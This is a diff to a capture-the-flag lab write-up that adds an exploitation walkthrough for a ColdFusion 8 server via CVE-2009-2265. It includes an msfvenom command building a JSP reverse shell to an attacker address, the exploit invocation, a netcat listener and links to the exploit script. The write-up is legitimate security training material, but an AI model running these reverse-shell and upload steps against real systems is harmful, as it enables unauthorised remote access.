@@ -45,9 +45,36 @@ Check consecutively **http://10.10.10.11:8500/CFIDE/** -> **http://10.10.10.11:8
 
 ## Exploitation & Gaining Access
 
-### Method 1: 
+### Method 1: [CVE-2009-2265](https://github.com/c0d3cr4f73r/CVE-2009-2265/blob/main/upload.py) - Without Metasploit
+`searchsploit ColdFusion 8.0`
 
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8ebb9589-7dde-449e-b246-753a5516da14)
 
+Without metasploit, download the exploit: [CVE-2009-2265](https://github.com/c0d3cr4f73r/CVE-2009-2265/blob/main/upload.py)
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/249d5d95-b6cf-4463-b08a-c0a89556408d)
+
+Generate a **jsp** reverse shell payload with msfvenom:
+
+```
+msfvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.24 lport=4444 -f raw -o payload.jsp
+```
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/8a065239-c0c4-444b-b822-4fbb82ec1195)
+
+Execute the exploit: `python2 upload.py 10.10.10.11 8500 payload.jsp`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/14c69e8e-c227-4fd2-8387-c2d648fb6979)
+
+Start netcat listener: `nc -lnvp 4444`
+
+Visit the payload on the browser: `http://10.10.10.11:8500/userfiles/file/exploit.jsp`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/4742bb0b-33c5-4a3a-bcb9-7d4e30059efa)
+
+Get the revershell, and read the user.txt flag.
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c7c29511-3e4a-44e2-a455-cbb6fde1a4a6)
 
 
 ## Privilege Escalation
@@ -67,7 +94,9 @@ Check consecutively **http://10.10.10.11:8500/CFIDE/** -> **http://10.10.10.11:8
 
 
 ## CVE Scripting
-+ x
++ **CVE-2009-2265:**
+  + https://github.com/c0d3cr4f73r/CVE-2009-2265/tree/main
+    + https://github.com/c0d3cr4f73r/CVE-2009-2265/blob/main/upload.py
 
 
 ## Tools
